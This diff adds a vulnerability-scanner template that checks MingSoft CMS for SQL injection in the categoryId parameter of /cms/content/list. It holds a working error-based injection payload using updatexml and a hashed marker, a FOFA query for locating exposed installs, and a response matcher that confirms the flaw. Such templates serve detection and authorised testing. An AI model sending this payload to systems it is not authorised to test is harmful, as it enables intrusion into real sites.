@@ -1,0 +1,17 @@
+id: poc-yaml-mingsoft-cms-list-sqli
+info:
+  name: 铭飞CMS list SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 铭飞CMS
+  fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)%20and%20%271
+  expression: status_code == 500 && contains(body,"\"result\":false") && contains(body,substr(t2,0,31))
+    && contains(content_type,"application/json")
+transport: http
